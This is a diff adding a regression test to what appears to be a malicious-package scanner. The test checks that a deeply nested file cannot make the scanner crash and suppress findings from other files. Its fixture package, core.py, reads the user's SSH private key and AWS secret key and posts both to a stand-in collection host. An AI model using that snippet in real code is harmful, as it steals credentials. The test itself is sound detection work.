@@ -55,3 +55,28 @@ def test_unparseable_file_is_signal_not_crash():
 def test_sensitive_path_reference():
     src = "open('/home/user/.ssh/id_rsa').read()\n"
     assert Code.FS_SENSITIVE in _codes(analyzer.analyze(_ctx(src)))
+
+
+def test_deeply_nested_valid_file_cannot_suppress_findings_from_other_files():
+    """Regression: a recursive NodeVisitor raised RecursionError on a 1000-term expression, the analyzer
+    crashed, and every credential-access finding of the package was replaced by one ANALYZER_ERROR."""
+    import concurrent.futures as cf
+
+    padding = "TABLE = 0" + " + 1" * 1000 + "\n"
+    core = (
+        "import os, requests\n"
+        "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
+        "secret = os.environ['AWS_SECRET_ACCESS_KEY']\n"
+        "requests.post('https://example.invalid/collect', data=key + secret)\n"
+    )
+    ctx = PackageContext(ecosystem="pypi", name="zqxwvhelper", version="1.0", files=[
+        SourceFile(relpath="zqxwvhelper/_table.py", text=padding, size=len(padding)),
+        SourceFile(relpath="zqxwvhelper/core.py", text=core, size=len(core)),
+    ])
+    with cf.ThreadPoolExecutor(max_workers=1) as pool:  # analyzers run in worker threads in production
+        signals = pool.submit(analyzer.analyze, ctx).result()
+    codes = _codes(signals)
+    assert {Code.ENV_HARVEST, Code.FS_SENSITIVE, Code.NETWORK_EGRESS} <= codes
+    assert Code.UNPARSEABLE not in codes
+    env = next(s for s in signals if s.code == Code.ENV_HARVEST)
+    assert env.location.file == "zqxwvhelper/core.py" and env.location.line == 3
